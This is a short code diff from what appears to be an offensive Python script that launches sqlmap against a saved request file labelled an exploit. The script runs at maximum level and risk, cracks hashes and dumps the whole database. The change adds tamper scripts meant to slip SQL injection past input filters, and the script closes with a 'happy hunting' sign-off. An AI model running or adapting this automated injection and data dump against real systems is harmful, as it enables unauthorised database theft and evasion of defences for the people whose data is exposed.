@@ -23,7 +23,7 @@ if not os.path.exists(exploit_path):
     print(Fore.RED + f"❌ Exploit file not found at {exploit_path}. Please generate it first.")
     exit(1)
 
-cmd = f'python "{sqlmap_path}" -r "{exploit_path}" --tamper=space2comment --dbms=mysql --time-sec=7 --random-agent --level=5 --risk=3 --batch --answers="crack=Y,dict=Y,continue=Y,quit=N" --dump'
+cmd = f'python "{sqlmap_path}" -r "{exploit_path}" --tamper="space2comment,apostrophemask,bypass" --dbms=mysql --time-sec=7 --random-agent --level=5 --risk=3 --batch --answers="crack=Y,dict=Y,continue=Y,quit=N" --dump'
 os.system(cmd)
 
 print(Fore.RED + "Happy hunting with nu11secur1ty =)")
